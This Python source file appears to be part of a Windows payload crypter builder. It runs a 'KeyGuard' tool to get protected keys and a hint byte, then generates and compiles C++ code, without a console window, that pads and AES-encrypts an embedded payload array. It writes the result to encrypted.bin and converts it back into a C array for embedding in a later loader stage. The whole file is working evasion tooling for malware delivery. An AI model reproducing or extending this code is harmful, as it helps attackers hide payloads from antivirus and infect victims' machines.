import os
import re

def get_keyguard():
    os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -w -o KeyGuard KeyGuard.c -mwindows")
    os.system("KeyGuard.exe 32")
    pattern = re.compile(r'unsigned char (\w+)\[\] = \{[^}]+\};', re.DOTALL)
    hint_pattern = re.compile(r'\[\+\] Using "(0x[0-9A-Fa-f]+)" As A Hint Byte')
    keys = {}
    HintByte = ""
    stdout_text = os.popen("KeyGuard.exe 32").read()
    hint_match = hint_pattern.search(stdout_text)
    if hint_match:
        HintByte = hint_match.group(1)
    for match in pattern.finditer(stdout_text):
        key_name = match.group(1)
        key_value = match.group(0)  
        keys[key_name] = key_value
    OriginalKey = keys.get("OriginalKey", "")
    ProtectedKey = keys.get("ProtectedKey", "")
    os.remove("KeyGuard.exe")
    return OriginalKey, ProtectedKey, HintByte

def build_encryptor (Encryption, Payload):

    f = open ("encryptor.cpp", "a")
    f.write(f"""
#include <iostream>
#include <string> 
#include <Windows.h>
#include <stdio.h>
#include "Libraries/{Encryption}"
#include "Libraries/Padding.h"

FILE create_ecrypted_binary_file(PBYTE pPayloadAddress, DWORD pPayloadSize)
{{
    FILE *file;
    file = fopen("encrypted.bin", "wb");
    fwrite(pPayloadAddress, pPayloadSize, 1, file);
    fclose(file);
}}
            
int main()
{{
    PBYTE pPayloadAddress;
    DWORD pPayloadSize;      
    {Payload}

    pPayloadSize = sizeof(Data_RawData);
    pPayloadAddress = Data_RawData;

    SIZE_T payloadSize = (SIZE_T)pPayloadSize;
    PaddBuffer(pPayloadAddress, payloadSize, &pPayloadAddress, &payloadSize);
    //pPayloadSize = (DWORD)payloadSize;

    {get_keyguard()[0]};

    size_t sKeySize = sizeof(OriginalKey);
    PBYTE pbKey = (PBYTE)OriginalKey;

    Encrypt(pPayloadAddress, pPayloadSize, pbKey, sKeySize);
    create_ecrypted_binary_file(pPayloadAddress, pPayloadSize);
            
    return 0;
}}
""")
    
    f.close()
    os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -w -o encryptor encryptor.cpp TinyAES.c -mwindows")
    os.system("encryptor.exe")
    os.remove("encryptor.cpp")
    os.remove("encryptor.exe")
    return

def read_encrypted_payload():
    with open("encrypted.bin", "rb") as file:
        content = file.read()
        payload = "unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), content)) + "};"
        return payload
    

